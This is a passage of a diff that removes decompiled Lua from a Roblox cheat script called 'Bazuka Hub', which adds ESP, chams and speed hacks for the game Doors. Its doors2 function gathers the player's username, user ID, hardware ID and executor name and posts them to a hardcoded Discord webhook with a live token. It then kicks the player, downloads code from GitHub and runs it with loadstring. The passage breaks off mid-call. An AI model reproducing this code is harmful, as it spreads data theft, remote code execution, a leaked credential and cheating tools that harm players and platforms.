-fenv.nametoolshedespcolora = _4865
-fenv.glowstickchamsstatus = _4870
-fenv.glowstickchamsoutlinetransparencya = _4875
-fenv.b = _4879
-fenv.g = _4878
-fenv.r = _4877
-fenv.glowstickchamsoutlinecolora = _4884
-fenv.glowstickchamsfillingtransparencya = _4889
-fenv.b = _4893
-fenv.g = _4892
-fenv.r = _4891
-fenv.glowstickchamsfillingcolora = _4898
-fenv.glowstickespstatus = _4903
-fenv.glowstickespoffseta = _4908
-fenv.enabledglowstickoutline = _4911
-fenv.nameglowstickespstatus = _4914
-fenv.distanceglowstickespstatus = _4917
-fenv.textsizenameglowsticka = _4921
-fenv.b = _4925
-fenv.g = _4924
-fenv.r = _4923
-fenv.nameglowstickespcolora = _4930
-fenv.fusechamsstatus = _4935
-fenv.fusechamsoutlinetransparencya = _4940
-fenv.b = _4944
-fenv.g = _4943
-fenv.r = _4942
-fenv.fusechamsoutlinecolora = _4949
-fenv.fusechamsfillingtransparencya = _4954
-fenv.b = _4958
-fenv.g = _4957
-fenv.r = _4956
-fenv.fusechamsfillingcolora = _4963
-fenv.fuseespstatus = _4968
-fenv.fuseespoffseta = _4973
-fenv.enabledfuseoutline = _4976
-fenv.namefuseespstatus = _4979
-fenv.distancefuseespstatus = _4982
-fenv.textsizenamefusea = _4986
-fenv.b = _4990
-fenv.g = _4989
-fenv.r = _4988
-fenv.namefuseespcolora = _4995
-fenv.lighterchamsstatus = _5000
-fenv.lighterchamsoutlinetransparencya = _5005
-fenv.b = _5009
-fenv.g = _5008
-fenv.r = _5007
-fenv.lighterchamsoutlinecolora = _5014
-fenv.lighterchamsfillingtransparencya = _5019
-fenv.b = _5023
-fenv.g = _5022
-fenv.r = _5021
-fenv.lighterchamsfillingcolora = _5028
-fenv.lighterespstatus = _5033
-fenv.lighterespoffseta = _5038
-fenv.enabledlighteroutline = _5041
-fenv.namelighterespstatus = _5044
-fenv.distancelighterespstatus = _5047
-fenv.textsizenamelightera = _5051
-fenv.b = _5055
-fenv.g = _5054
-fenv.r = _5053
-fenv.namelighterespcolora = _5060
-fenv.batterychamsstatus = _5065
-fenv.batterychamsoutlinetransparencya = _5070
-fenv.b = _5074
-fenv.g = _5073
-fenv.r = _5072
-fenv.batterychamsoutlinecolora = _5079
-fenv.batterychamsfillingtransparencya = _5084
-fenv.b = _5088
-fenv.g = _5087
-fenv.r = _5086
-fenv.batterychamsfillingcolora = _5093
-fenv.batteryespstatus = _5098
-fenv.batteryespoffseta = _5103
-fenv.enabledbatteryoutline = _5106
-fenv.namebatteryespstatus = _5109
-fenv.distancebatteryespstatus = _5112
-fenv.textsizenamebatterya = _5116
-fenv.b = _5120
-fenv.g = _5119
-fenv.r = _5118
-fenv.namebatteryespcolora = _5125
-fenv.goldchamsstatus = _5130
-fenv.goldchamsoutlinetransparencya = _5135
-fenv.b = _5139
-fenv.g = _5138
-fenv.r = _5137
-fenv.goldchamsoutlinecolora = _5144
-fenv.goldchamsfillingtransparencya = _5149
-fenv.b = _5153
-fenv.g = _5152
-fenv.r = _5151
-fenv.goldchamsfillingcolora = _5158
-fenv.goldespstatus = _5163
-fenv.goldespoffseta = _5168
-fenv.enabledgoldoutline = _5171
-fenv.namegoldespstatus = _5174
-fenv.distancegoldespstatus = _5177
-fenv.textsizenamegolda = _5181
-fenv.b = _5185
-fenv.g = _5184
-fenv.r = _5183
-fenv.namegoldespcolora = _5190
-fenv.bandagechamsstatus = _5195
-fenv.bandagechamsoutlinetransparencya = _5200
-fenv.b = _5204
-fenv.g = _5203
-fenv.r = _5202
-fenv.bandagechamsoutlinecolora = _5209
-fenv.bandagechamsfillingtransparencya = _5214
-fenv.b = _5218
-fenv.g = _5217
-fenv.r = _5216
-fenv.bandagechamsfillingcolora = _5223
-fenv.bandageespstatus = _5228
-fenv.bandageespoffseta = _5233
-fenv.enabledbandageoutline = _5236
-fenv.namebandageespstatus = _5239
-fenv.distancebandageespstatus = _5242
-fenv.textsizenamebandagea = _5246
-fenv.b = _5250
-fenv.g = _5249
-fenv.r = _5248
-fenv.namebandageespcolora = _5255
-fenv.eternaljump = _5292
-fenv.speedbypass = _5295
-fenv.walkspeedmultiplier = _5298
-fenv.walkspeedplayer = _5303
-fenv.oxygenchanger = _5306
-fenv.customoxygen = _5310
-fenv.doors2 = function(_3937, _3937_2, _3937_3)
-    local _3938 = game.Players.LocalPlayer
-    local _3939 = _3938.UserId
-    local _3940 = game.Players.LocalPlayer
-    local _3941 = _3940.DisplayName
-    local _3942 = game.Players.LocalPlayer
-    local _3943 = _3942.Name
-    local _RbxAnalyticsService3944 = game:GetService("RbxAnalyticsService")
-    local _3945 = _RbxAnalyticsService3944.GetClientId
-    local _3946 = _3945(_RbxAnalyticsService3944)
-    local _MarketplaceService3947 = game:GetService("MarketplaceService")
-    local _3948 = _MarketplaceService3947.GetProductInfo
-    local _3949 = _3948(_MarketplaceService3947, game.PlaceId)
-    local _3950 = _3949.Name
-    local _3951, _3951_2 = identifyexecutor()
-    local _3952, _3952_2, _3952_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _3939, _3941, _3943, _3939, _3946, "03/21/2025", "14:26:59", game.PlaceId, _3950, game.PlaceId, _3951)
-    local _3953 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _3939
-    local _3954 = _3953 .. "&width=150&height=150&format=png"
-    local _HttpService3955 = game:GetService("HttpService")
-    local _3956 = _HttpService3955.JSONEncode
-    local _3957 = _3956(_HttpService3955, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _3952,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _3954,
-                },
-            },
-        },
-    })
-    local _3958 = _3957.gsub
-    local _3959 = _3958(_3957, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _3959,
-    })
-    local _3961 = game.Players.LocalPlayer
-    local _3962 = _3961.Kick
-    _3962(_3961, "GOT YOU XD!")
-    local _3964 = game:HttpGet("https://raw.githubusercontent.com/Reyn7525/GUI_LIB/refs/heads/main/HydraHub")
-    local _3965 = loadstring(_3964)
-    local _3966 = _3965()
-    local _3967 = _3966.new
-    local _3968 = game.Players.LocalPlayer
-    local _3969 = _3968.DisplayName
-    local _3970 = _3967("Bazuka Hub", _3969, "Bazuka Hub")
-    local _3971 = _3970.Category
-    local _3972 = _3971(_3970, "Info", "http://www.roblox.com/asset/?id=12707252279")
-    local _3973 = _3970.Category
-    local _3974 = _3973(_3970, "Misc", "http://www.roblox.com/asset/?id=97163436981193")
-    local _3975 = _3970.Category
-    local _3976 = _3975(_3970, "Visual", "http://www.roblox.com/asset/?id=13321848320")
-    local _3977 = _3970.Category
-    local _3978 = _3977(_3970, "Character", "http://www.roblox.com/asset/?id=8395621517")
-    local _3979 = _3970.Category
-    _3979(_3970, "Other", "http://www.roblox.com/asset/?id=11932591062")
-    local _3981 = Color3.fromRGB
-    _3981(255, 255, 255)
-    local _3983 = Color3.fromRGB
-    _3983(0, 0, 0)
-    local _3985 = Color3.fromRGB
-    _3985(160, 160, 160)
-    local _3987 = Color3.fromRGB
-    _3987(0, 0, 0)
-    local _3989 = Color3.fromRGB
-    local _3990 = _3989(255, 255, 255)
-    local _ = game.Lighting.FogColor
-    local _3992 = Color3.fromRGB
-    local _3993 = _3992(255, 255, 255)
-    local _ = game.Lighting.FogEnd
-    local _ = game.Lighting.FogStart
-    local _3996 = Color3.fromRGB
-    local _3997 = _3996(255, 255, 255)
-    local _3998 = Color3.fromRGB
-    local _3999 = _3998(255, 255, 255)
-    local _4000 = Color3.fromRGB
-    local _4001 = _4000(255, 255, 255)
-    local _4002 = Color3.fromRGB
-    local _4003 = _4002(255, 255, 255)
-    local _4004 = Color3.fromRGB
-    local _4005 = _4004(255, 255, 255)
-    local _4006 = Color3.fromRGB
-    local _4007 = _4006(255, 255, 255)
-    local _4008 = Color3.fromRGB
-    local _4009 = _4008(255, 255, 255)
-    local _4010 = Color3.fromRGB
-    local _4011 = _4010(255, 255, 255)
-    local _4012 = Color3.fromRGB
-    local _4013 = _4012(255, 255, 255)
-    local _4014 = Color3.fromRGB
-    local _4015 = _4014(255, 255, 255)
-    local _4016 = Color3.fromRGB
-    local _4017 = _4016(255, 255, 255)
-    local _4018 = Color3.fromRGB
-    local _4019 = _4018(255, 255, 255)
-    local _4020 = Color3.fromRGB
-    local _4021 = _4020(255, 255, 255)
-    local _4022 = Color3.fromRGB
-    local _4023 = _4022(255, 255, 255)
-    local _4024 = Color3.fromRGB
-    local _4025 = _4024(255, 255, 255)
-    local _4026 = Color3.fromRGB
-    local _4027 = _4026(255, 255, 255)
-    local _4028 = Color3.fromRGB
-    local _4029 = _4028(255, 255, 255)
-    local _4030 = Color3.fromRGB
-    local _4031 = _4030(255, 255, 255)
-    local _4032 = Color3.fromRGB
-    local _4033 = _4032(255, 255, 255)
-    local _4034 = Color3.fromRGB
-    local _4035 = _4034(255, 255, 255)
-    local _4036 = Color3.fromRGB
-    local _4037 = _4036(255, 255, 255)
-    local _4038 = Color3.fromRGB
-    local _4039 = _4038(255, 255, 255)
-    local _4040 = Color3.fromRGB
-    local _4041 = _4040(255, 255, 255)
-    local _4042 = Color3.fromRGB
-    local _4043 = _4042(255, 255, 255)
-    local _4044 = Color3.fromRGB
-    local _4045 = _4044(255, 255, 255)
-    local _4046 = Color3.fromRGB
-    local _4047 = _4046(255, 255, 255)
-    local _4048 = Color3.fromRGB
-    local _4049 = _4048(255, 255, 255)
-    local _4050 = Color3.fromRGB
-    local _4051 = _4050(255, 255, 255)
-    local _4052 = Color3.fromRGB
-    local _4053 = _4052(255, 255, 255)
-    local _4054 = Color3.fromRGB
-    local _4055 = _4054(255, 255, 255)
-    local _4056 = Color3.fromRGB
-    local _4057 = _4056(255, 255, 255)
-    local _4058 = Color3.fromRGB
-    local _4059 = _4058(255, 255, 255)
-    local _4060 = Color3.fromRGB
-    local _4061 = _4060(255, 255, 255)
-    local _4062 = Color3.fromRGB
-    local _4063 = _4062(255, 255, 255)
-    local _4064 = Color3.fromRGB
-    local _4065 = _4064(255, 255, 255)
-    local _4066 = Color3.fromRGB
-    local _4067 = _4066(255, 255, 255)
-    local _4068 = Color3.fromRGB
-    local _4069 = _4068(255, 255, 255)
-    local _4070 = Color3.fromRGB
-    local _4071 = _4070(255, 255, 255)
-    local _4072 = Color3.fromRGB
-    local _4073 = _4072(255, 255, 255)
-    local _4074 = Color3.fromRGB
-    local _4075 = _4074(255, 255, 255)
-    local _4076 = Color3.fromRGB
-    local _4077 = _4076(255, 255, 255)
-    local _4078 = Color3.fromRGB
-    local _4079 = _4078(255, 255, 255)
-    local _4080 = Color3.fromRGB
-    local _4081 = _4080(255, 255, 255)
-    local _4082 = Color3.fromRGB
-    local _4083 = _4082(255, 255, 255)
-    local _4084 = Color3.fromRGB
-    local _4085 = _4084(255, 255, 255)
-    local _4086 = Color3.fromRGB
-    local _4087 = _4086(255, 255, 255)
-    local _4088 = Color3.fromRGB
-    local _4089 = _4088(255, 255, 255)
-    local _4090 = Color3.fromRGB
-    local _4091 = _4090(255, 255, 255)
-    task.spawn(function(_4093, _4093_2, _4093_3)
-        writefile(".tests/readfile.txt", "success")
-    end)
-    task.spawn(function(_4096, _4096_2, _4096_3)
-    end)
-    task.spawn(function(_4098, _4098_2, _4098_3)
-        writefile(".tests/writefile.txt", "success")
-    end)
-    task.spawn(function(_4101, _4101_2, _4101_3)
-        writefile(".tests/appendfile.txt", "su")
-    end)
-    local _4102 = _3970.Notification
-    _4102(_3970, {
-        expire = 3,
-        Title = "Bazuka Hub",
-        Desc = "Your executor doesnt support config system!",
-    })
-    local _4104 = _3972.Button
-    local _4105 = _4104(_3972, "Information", "http://www.roblox.com/asset/?id=12707252279")
-    local _4106 = _4105.Section
-    local _4107 = _4106(_4105, "GUI was made by Bazuka_ofcx", "Left")
-    local _4108 = _4107.Button
-    _4108(_4107, {
-        ButtonName = "Copy Link",
-        Title = "GUI Library",
-        Description = "Modified Bazuka Hub",
-    }, function(_4110, _4110_2, _4110_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _4111 = _4107.Button
-    _4111(_4107, {
-        ButtonName = "Copy Link",
-        Title = "Discord link",
-        Description = "Our Discord Server",
-    }, function(_4113, _4113_2, _4113_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _4114 = _4105.Section
-    _4114(_4105, "Information:", "Left")
-    local _4116 = _4105.Section
-    _4116(_4105, "Last Update Changelog:", "Right")
-    local _4118 = _3974.Button
-    local _4119 = _4118(_3974, "Misc Features", "http://www.roblox.com/asset/?id=97163436981193")
-    local _4120 = _4119.Section
-    local _4121 = _4120(_4119, "Entity protection", "Left")
-    local _4122 = _4121.Toggle
-    _4122(_4121, {
-        Default = false,
-        Description = "You can't be Stunned",
-        Title = "Anti Stun",
-    }, function(_4124, _4124_2, _4124_3)
-    end)
-    local _4125 = _4121.Toggle
-    _4125(_4121, {
-        Default = false,
-        Description = "Figure Can't Hear You",
-        Title = "Anti Hearing",
-    }, function(_4127, _4127_2, _4127_3)
-    end)
-    local _4128 = _4121.Toggle
-    _4128(_4121, {
-        Default = false,
-        Description = "Eyes Can't Hurt You",
-        Title = "Anti Eyes",
-    }, function(_4130, _4130_2, _4130_3)
-    end)
-    local _4131 = _4121.Toggle
-    _4131(_4121, {
-        Default = false,
-        Description = "Giggle can't hurt you",
-        Title = "Anti Giggle",
-    }, function(_4133, _4133_2, _4133_3)
-    end)
-    local _4134 = _4121.Toggle
-    _4134(_4121, {
-        Default = false,
-        Description = "Screech won't spawn",
-        Title = "Anti Screech",
-    }, function(_4136, _4136_2, _4136_3)
-    end)
-    local _4137 = _4119.Section
-    local _4138 = _4137(_4119, "Other Game Functions", "Right")
-    local _4139 = _4138.Toggle
-    _4139(_4138, {
-        Default = false,
-        Description = "Instantly Prompting",
-        Title = "Instant Prompt",
-    }, function(_4141, _4141_2, _4141_3)
-    end)
-    local _4142 = _4138.Slider
-    _4142(_4138, {
-        Min = 1,
-        Title = "Render Delay",
-        Max = 200,
-        Default = 50,
-        Description = "",
-    }, function(_4144, _4144_2, _4144_3)
-        local _4145, _4145_2, _4145_3 = math.floor(_4144)
-        local _ = _4145 / 100
-    end)
-    local _4147 = _3974.Button
-    local _4148 = _4147(_3974, "Spawn Notification", "http://www.roblox.com/asset/?id=11401835376")
-    local _4149 = _4148.Section
-    local _4150 = _4149(_4148, "Spawn Notifications", "Left")
-    local _4151 = _4150.Toggle
-    _4151(_4150, {
-        Default = false,
-        Description = "Notify You When Eyes Spawn",
-        Title = "Eyes Spawn",
-    }, function(_4153, _4153_2, _4153_3)
-    end)
-    local _4154 = _4150.Toggle
-    _4154(_4150, {
-        Default = false,
-        Description = "Notify You When Rush Spawn",
-        Title = "Rush Spawn",
-    }, function(_4156, _4156_2, _4156_3)
-    end)
-    local _4157 = _4150.Toggle
-    _4157(_4150, {
-        Default = false,
-        Description = "Notify You When Ambush Spawn",
-        Title = "Ambush Spawn",
-    }, function(_4159, _4159_2, _4159_3)
-    end)
-    local _4160 = _3976.Button
-    local _4161 = _4160(_3976, "World", "http://www.roblox.com/asset/?id=11887653877")
-    local _4162 = _4161.Section
-    local _4163 = _4162(_4161, "Custom Fog", "Left")
-    local _4164 = _4163.Toggle
-    _4164(_4163, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4166, _4166_2, _4166_3)
-    end)
-    local _4167 = _4163.Slider
-    _4167(_4163, {
-        Min = 0,
-        Title = "Fog End",
-        Max = 5000,
-        Default = 1000,
-        Description = "",
-    }, function(_4169, _4169_2, _4169_3)
-        math.floor(_4169)
-    end)
-    local _4171 = _4163.Slider
-    _4171(_4163, {
-        Min = 0,
-        Title = "Fog Start",
-        Max = 2000,
-        Default = 100,
-        Description = "",
-    }, function(_4173, _4173_2, _4173_3)
-        math.floor(_4173)
-    end)
-    type(_3993)
-    local _ = _3993.r
-    local _ = _3993.g
-    local _ = _3993.b
-    local _4179 = _4163.ColorPicker
-    local _4180 = Color3.new
-    local _4181 = _4180()
-    _4179(_4163, {
-        Default = _4181,
-        Description = "",
-        Title = "Fog Color",
-    }, function(_4183, _4183_2, _4183_3)
-    end)
-    local _4184 = _4161.Section
-    local _4185 = _4184(_4161, "Light Around Player", "Right")
-    local _4186 = _4185.Toggle
-    _4186(_4185, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4188, _4188_2, _4188_3)
-    end)
-    local _4189 = _4185.Toggle
-    _4189(_4185, {
-        Default = false,
-        Description = "",
-        Title = "Shadows",
-    }, function(_4191, _4191_2, _4191_3)
-    end)
-    local _4192 = _4185.Slider
-    _4192(_4185, {
-        Min = 0,
-        Title = "Range",
-        Max = 60,
-        Default = 60,
-        Description = "",
-    }, function(_4194, _4194_2, _4194_3)
-        math.floor(_4194)
-    end)
-    local _4196 = _4185.Slider
-    _4196(_4185, {
-        Min = 0,
-        Title = "Brightness",
-        Max = 100,
-        Default = 10,
-        Description = "",
-    }, function(_4198, _4198_2, _4198_3)
-        local _4199 = _4198 / 10
-        math.floor(_4199)
-    end)
-    type(_3990)
-    local _ = _3990.r
-    local _ = _3990.g
-    local _ = _3990.b
-    local _4205 = _4185.ColorPicker
-    local _4206 = Color3.new
-    local _4207 = _4206()
-    _4205(_4185, {
-        Default = _4207,
-        Description = "",
-        Title = "Color",
-    }, function(_4209, _4209_2, _4209_3)
-    end)
-    local _4210 = _3976.Button
-    local _4211 = _4210(_3976, "Room Chams & ESP", "http://www.roblox.com/asset/?id=13200016780")
-    local _4212 = _4211.Section
-    local _4213 = _4212(_4211, "Real Door Chams", "Left")
-    local _4214 = _4213.Toggle
-    _4214(_4213, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4216, _4216_2, _4216_3)
-    end)
-    local _4217 = _4213.Slider
-    _4217(_4213, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4219, _4219_2, _4219_3)
-        local _4220, _4220_2, _4220_3 = math.floor(_4219)
-        local _ = _4220 / 100
-    end)
-    type(_4001)
-    local _ = _4001.r
-    local _ = _4001.g
-    local _ = _4001.b
-    local _4226 = _4213.ColorPicker
-    local _4227 = Color3.new
-    local _4228 = _4227()
-    _4226(_4213, {
-        Default = _4228,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4230, _4230_2, _4230_3)
-    end)
-    local _4231 = _4213.Slider
-    _4231(_4213, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4233, _4233_2, _4233_3)
-        local _4234, _4234_2, _4234_3 = math.floor(_4233)
-        local _ = _4234 / 100
-    end)
-    type(_4003)
-    local _ = _4003.r
-    local _ = _4003.g
-    local _ = _4003.b
-    local _4240 = _4213.ColorPicker
-    local _4241 = Color3.new
-    local _4242 = _4241()
-    _4240(_4213, {
-        Default = _4242,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4244, _4244_2, _4244_3)
-    end)
-    local _4245 = _4211.Section
-    local _4246 = _4245(_4211, "Real Door ESP", "Right")
-    local _4247 = _4246.Toggle
-    _4247(_4246, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4249, _4249_2, _4249_3)
-    end)
-    local _4250 = _4246.Slider
-    _4250(_4246, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4252, _4252_2, _4252_3)
-        local _4253, _4253_2, _4253_3 = math.floor(_4252)
-        local _ = _4253 / 100
-    end)
-    local _4255 = _4246.Toggle
-    _4255(_4246, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4257, _4257_2, _4257_3)
-    end)
-    local _4258 = _4246.Toggle
-    _4258(_4246, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4260, _4260_2, _4260_3)
-    end)
-    local _4261 = _4246.Toggle
-    _4261(_4246, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4263, _4263_2, _4263_3)
-    end)
-    local _4264 = _4246.Slider
-    _4264(_4246, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4266, _4266_2, _4266_3)
-        math.floor(_4266)
-    end)
-    type(_4071)
-    local _ = _4071.r
-    local _ = _4071.g
-    local _ = _4071.b
-    local _4272 = _4246.ColorPicker
-    local _4273 = Color3.new
-    local _4274 = _4273()
-    _4272(_4246, {
-        Default = _4274,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4276, _4276_2, _4276_3)
-    end)
-    local _4277 = _4211.Section
-    local _4278 = _4277(_4211, "Fake Door Chams", "Left")
-    local _4279 = _4278.Toggle
-    _4279(_4278, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4281, _4281_2, _4281_3)
-    end)
-    local _4282 = _4278.Slider
-    _4282(_4278, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4284, _4284_2, _4284_3)
-        local _4285, _4285_2, _4285_3 = math.floor(_4284)
-        local _ = _4285 / 100
-    end)
-    type(_3997)
-    local _ = _3997.r
-    local _ = _3997.g
-    local _ = _3997.b
-    local _4291 = _4278.ColorPicker
-    local _4292 = Color3.new
-    local _4293 = _4292()
-    _4291(_4278, {
-        Default = _4293,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4295, _4295_2, _4295_3)
-    end)
-    local _4296 = _4278.Slider
-    _4296(_4278, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4298, _4298_2, _4298_3)
-        local _4299, _4299_2, _4299_3 = math.floor(_4298)
-        local _ = _4299 / 100
-    end)
-    type(_3999)
-    local _ = _3999.r
-    local _ = _3999.g
-    local _ = _3999.b
-    local _4305 = _4278.ColorPicker
-    local _4306 = Color3.new
-    local _4307 = _4306()
-    _4305(_4278, {
-        Default = _4307,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4309, _4309_2, _4309_3)
-    end)
-    local _4310 = _4211.Section
-    local _4311 = _4310(_4211, "Fake Door ESP", "Right")
-    local _4312 = _4311.Toggle
-    _4312(_4311, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4314, _4314_2, _4314_3)
-    end)
-    local _4315 = _4311.Slider
-    _4315(_4311, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4317, _4317_2, _4317_3)
-        local _4318, _4318_2, _4318_3 = math.floor(_4317)
-        local _ = _4318 / 100
-    end)
-    local _4320 = _4311.Toggle
-    _4320(_4311, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4322, _4322_2, _4322_3)
-    end)
-    local _4323 = _4311.Toggle
-    _4323(_4311, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4325, _4325_2, _4325_3)
-    end)
-    local _4326 = _4311.Toggle
-    _4326(_4311, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4328, _4328_2, _4328_3)
-    end)
-    local _4329 = _4311.Slider
-    _4329(_4311, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4331, _4331_2, _4331_3)
-        math.floor(_4331)
-    end)
-    type(_4073)
-    local _ = _4073.r
-    local _ = _4073.g
-    local _ = _4073.b
-    local _4337 = _4311.ColorPicker
-    local _4338 = Color3.new
-    local _4339 = _4338()
-    _4337(_4311, {
-        Default = _4339,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4341, _4341_2, _4341_3)
-    end)
-    local _4342 = _4211.Section
-    local _4343 = _4342(_4211, "Generator Chams", "Left")
-    local _4344 = _4343.Toggle
-    _4344(_4343, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4346, _4346_2, _4346_3)
-    end)
-    local _4347 = _4343.Slider
-    _4347(_4343, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4349, _4349_2, _4349_3)
-        local _4350, _4350_2, _4350_3 = math.floor(_4349)
-        local _ = _4350 / 100
-    end)
-    type(_4005)
-    local _ = _4005.r
-    local _ = _4005.g
-    local _ = _4005.b
-    local _4356 = _4343.ColorPicker
-    local _4357 = Color3.new
-    local _4358 = _4357()
-    _4356(_4343, {
-        Default = _4358,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4360, _4360_2, _4360_3)
-    end)
-    local _4361 = _4343.Slider
-    _4361(_4343, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4363, _4363_2, _4363_3)
-        local _4364, _4364_2, _4364_3 = math.floor(_4363)
-        local _ = _4364 / 100
-    end)
-    type(_4007)
-    local _ = _4007.r
-    local _ = _4007.g
-    local _ = _4007.b
-    local _4370 = _4343.ColorPicker
-    local _4371 = Color3.new
-    local _4372 = _4371()
-    _4370(_4343, {
-        Default = _4372,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4374, _4374_2, _4374_3)
-    end)
-    local _4375 = _4211.Section
-    local _4376 = _4375(_4211, "Generator ESP", "Right")
-    local _4377 = _4376.Toggle
-    _4377(_4376, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4379, _4379_2, _4379_3)
-    end)
-    local _4380 = _4376.Slider
-    _4380(_4376, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4382, _4382_2, _4382_3)
-        local _4383, _4383_2, _4383_3 = math.floor(_4382)
-        local _ = _4383 / 100
-    end)
-    local _4385 = _4376.Toggle
-    _4385(_4376, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4387, _4387_2, _4387_3)
-    end)
-    local _4388 = _4376.Toggle
-    _4388(_4376, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_4390, _4390_2, _4390_3)
-    end)
-    local _4391 = _4376.Toggle
-    _4391(_4376, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_4393, _4393_2, _4393_3)
-    end)
-    local _4394 = _4376.Slider
-    _4394(_4376, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_4396, _4396_2, _4396_3)
-        math.floor(_4396)
-    end)
-    type(_4075)
-    local _ = _4075.r
-    local _ = _4075.g
-    local _ = _4075.b
-    local _4402 = _4376.ColorPicker
-    local _4403 = Color3.new
-    local _4404 = _4403()
-    _4402(_4376, {
-        Default = _4404,
-        Description = "",
-        Title = "Text Color",
-    }, function(_4406, _4406_2, _4406_3)
-    end)
-    local _4407 = _4211.Section
-    local _4408 = _4407(_4211, "Mines Anchor Chams", "Left")
-    local _4409 = _4408.Toggle
-    _4409(_4408, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4411, _4411_2, _4411_3)
-    end)
-    local _4412 = _4408.Slider
-    _4412(_4408, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_4414, _4414_2, _4414_3)
-        local _4415, _4415_2, _4415_3 = math.floor(_4414)
-        local _ = _4415 / 100
-    end)
-    type(_4009)
-    local _ = _4009.r
-    local _ = _4009.g
-    local _ = _4009.b
-    local _4421 = _4408.ColorPicker
-    local _4422 = Color3.new
-    local _4423 = _4422()
-    _4421(_4408, {
-        Default = _4423,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_4425, _4425_2, _4425_3)
-    end)
-    local _4426 = _4408.Slider
-    _4426(_4408, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_4428, _4428_2, _4428_3)
-        local _4429, _4429_2, _4429_3 = math.floor(_4428)
-        local _ = _4429 / 100
-    end)
-    type(_4011)
-    local _ = _4011.r
-    local _ = _4011.g
-    local _ = _4011.b
-    local _4435 = _4408.ColorPicker
-    local _4436 = Color3.new
-    local _4437 = _4436()
-    _4435(_4408, {
-        Default = _4437,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_4439, _4439_2, _4439_3)
-    end)
-    local _4440 = _4211.Section
-    local _4441 = _4440(_4211, "Mines Anchor ESP", "Right")
-    local _4442 = _4441.Toggle
-    _4442(_4441, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_4444, _4444_2, _4444_3)
-    end)
-    local _4445 = _4441.Slider
-    _4445(_4441, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_4447, _4447_2, _4447_3)
-        local _4448, _4448_2, _4448_3 = math.floor(_4447)
-        local _ = _4448 / 100
-    end)
-    local _4450 = _4441.Toggle
-    _4450(_4441, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_4452, _4452_2, _4452_3)
-    end)
-    local _4453 = _4441.Toggle
-    _4453(_4441, {
